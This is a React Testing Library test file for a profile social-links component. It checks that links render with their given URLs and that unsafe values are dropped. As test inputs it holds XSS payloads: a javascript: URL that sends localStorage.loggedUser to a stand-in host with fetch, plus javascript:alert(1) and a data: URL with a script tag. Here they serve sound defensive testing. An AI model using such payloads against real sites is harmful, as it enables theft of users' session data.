import { render, screen } from "@testing-library/react";
import ProfileSocialLinks from "./ProfileSocialLinks";

describe("ProfileSocialLinks", () => {
  // Ticket AC (Issue 17) / AC-096: no links set -> renders nothing at all,
  // not even an empty container.
  test("renders nothing when no links are set", () => {
    const { container } = render(<ProfileSocialLinks />);

    expect(container).toBeEmptyDOMElement();
  });

  // Ticket AC (Issue 17) / AC-098: each set link renders as an anchor
  // pointing at the exact URL provided.
  test("renders anchors with the provided hrefs when links are set", () => {
    render(
      <ProfileSocialLinks
        website="https://example.com"
        github="https://github.com/author"
        twitter="https://twitter.com/author"
      />,
    );

    expect(screen.getByRole("link", { name: "Website" })).toHaveAttribute(
      "href",
      "https://example.com",
    );
    expect(screen.getByRole("link", { name: "GitHub" })).toHaveAttribute(
      "href",
      "https://github.com/author",
    );
    expect(screen.getByRole("link", { name: "Twitter" })).toHaveAttribute(
      "href",
      "https://twitter.com/author",
    );
  });

  test("renders only the links that are set", () => {
    render(<ProfileSocialLinks website="https://example.com" />);

    expect(screen.getByRole("link", { name: "Website" })).toBeInTheDocument();
    expect(screen.queryByRole("link", { name: "GitHub" })).not.toBeInTheDocument();
    expect(screen.queryByRole("link", { name: "Twitter" })).not.toBeInTheDocument();
  });

  // REQ-063/AC-108: an unsafe stored value (e.g. `javascript:`) is not
  // rendered as a link at all, even while a sibling safe link still is.
  test("an unsafe website value is not rendered, a valid github link still is", () => {
    render(
      <ProfileSocialLinks
        website="javascript:fetch('//x/?'+localStorage.loggedUser)"
        github="https://github.com/author"
      />,
    );

    expect(screen.queryByRole("link", { name: "Website" })).not.toBeInTheDocument();
    expect(screen.getByRole("link", { name: "GitHub" })).toHaveAttribute(
      "href",
      "https://github.com/author",
    );
  });

  // REQ-063/AC-108: when every set link is unsafe, the component renders
  // nothing at all - same as having no links set.
  test("renders nothing when every set link is unsafe", () => {
    const { container } = render(
      <ProfileSocialLinks
        website="javascript:alert(1)"
        github="data:text/html,<script>alert(1)</script>"
        twitter="/relative/path"
      />,
    );

    expect(container).toBeEmptyDOMElement();
  });
});
